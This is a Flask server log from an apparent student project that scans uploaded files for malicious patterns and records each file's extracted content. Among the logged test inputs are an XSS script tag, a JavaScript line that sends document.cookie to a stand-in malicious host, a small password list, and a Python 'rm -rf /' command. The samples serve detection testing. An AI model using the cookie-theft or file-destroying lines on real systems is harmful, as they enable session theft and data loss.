2025-02-22 21:40:33,229 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,231 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,233 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,235 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,236 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,238 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,240 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,241 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,243 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,244 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,246 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,248 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,249 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,251 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,253 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,255 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,257 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,259 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,261 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,264 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,265 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,267 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,268 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,270 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,274 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,275 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,277 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,281 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,283 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,285 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,287 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,289 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,290 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,292 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,296 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,297 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,299 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,302 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,303 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,305 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,307 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,308 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,309 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,311 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,314 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,315 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,317 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,319 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,320 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,322 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,324 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,325 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,326 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,327 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,330 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,331 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,333 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,334 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,335 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,336 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,337 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,338 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,340 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,341 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,342 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,343 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,344 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,346 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,348 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,349 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,352 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,354 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,356 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,358 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,360 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,362 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,364 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,365 - Extracted content from uploads/test/test/45.xml: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,367 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,369 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,371 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,373 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:40:33,379 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:40:33,379 - [33mPress CTRL+C to quit[0m
2025-02-22 21:40:35,548 - 127.0.0.1 - - [22/Feb/2025 21:40:35] "GET / HTTP/1.1" 200 -
2025-02-22 21:40:40,300 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:40:40,305 - 127.0.0.1 - - [22/Feb/2025 21:40:40] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:40:40,311 - 127.0.0.1 - - [22/Feb/2025 21:40:40] "GET / HTTP/1.1" 200 -
2025-02-22 21:40:44,748 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:40:44,752 - 127.0.0.1 - - [22/Feb/2025 21:40:44] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:40:44,758 - 127.0.0.1 - - [22/Feb/2025 21:40:44] "GET / HTTP/1.1" 200 -
2025-02-22 21:40:53,454 - Error scanning uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:40:53,458 - 127.0.0.1 - - [22/Feb/2025 21:40:53] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:40:53,465 - 127.0.0.1 - - [22/Feb/2025 21:40:53] "GET / HTTP/1.1" 200 -
2025-02-22 21:42:30,431 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:42:30,431 - [33mPress CTRL+C to quit[0m
2025-02-22 21:42:38,230 - 127.0.0.1 - - [22/Feb/2025 21:42:38] "GET / HTTP/1.1" 200 -
2025-02-22 21:42:42,309 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:42:42,313 - 127.0.0.1 - - [22/Feb/2025 21:42:42] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:42:42,317 - 127.0.0.1 - - [22/Feb/2025 21:42:42] "GET / HTTP/1.1" 200 -
2025-02-22 21:43:44,536 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:43:44,536 - [33mPress CTRL+C to quit[0m
2025-02-22 21:43:50,166 - Extracted content from uploads/extracted.txt: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:43:50,168 - Malicious pattern detected in uploads/extracted.txt
2025-02-22 21:43:50,169 - 127.0.0.1 - - [22/Feb/2025 21:43:50] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:43:50,181 - 127.0.0.1 - - [22/Feb/2025 21:43:50] "GET / HTTP/1.1" 200 -
2025-02-22 21:43:54,236 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:43:54,241 - 127.0.0.1 - - [22/Feb/2025 21:43:54] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:43:54,245 - 127.0.0.1 - - [22/Feb/2025 21:43:54] "GET / HTTP/1.1" 200 -
2025-02-23 15:52:40,585 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 15:52:40,585 - [33mPress CTRL+C to quit[0m
2025-02-23 15:52:54,515 - 127.0.0.1 - - [23/Feb/2025 15:52:54] "GET / HTTP/1.1" 200 -
2025-02-23 15:52:54,558 - 127.0.0.1 - - [23/Feb/2025 15:52:54] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
2025-02-23 15:59:24,032 - Extracted content from uploads/BATCH_NO_6_FINAL (1).pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 30-01-2025 BATCH NO: 06
PRESENTED BY
SADHANA N(130721104072)
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
1
Department of CSE Jerusalem College of Engineering
30-Jan-25
OBJECTIVE
2
Department of CSE
Jerusalem College o
2025-02-23 15:59:24,038 - 127.0.0.1 - - [23/Feb/2025 15:59:24] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 15:59:24,042 - 127.0.0.1 - - [23/Feb/2025 15:59:24] "GET / HTTP/1.1" 200 -
2025-02-23 16:00:16,045 - 127.0.0.1 - - [23/Feb/2025 16:00:16] "[32mGET /delete/1 HTTP/1.1[0m" 302 -
2025-02-23 16:00:16,048 - 127.0.0.1 - - [23/Feb/2025 16:00:16] "GET / HTTP/1.1" 200 -
2025-02-23 16:00:18,869 - 127.0.0.1 - - [23/Feb/2025 16:00:18] "GET / HTTP/1.1" 200 -
2025-02-23 16:00:32,774 - Extracted content from uploads/BATCH_NO_6_FINAL (1).pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 30-01-2025 BATCH NO: 06
PRESENTED BY
SADHANA N(130721104072)
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
1
Department of CSE Jerusalem College of Engineering
30-Jan-25
OBJECTIVE
2
Department of CSE
Jerusalem College o
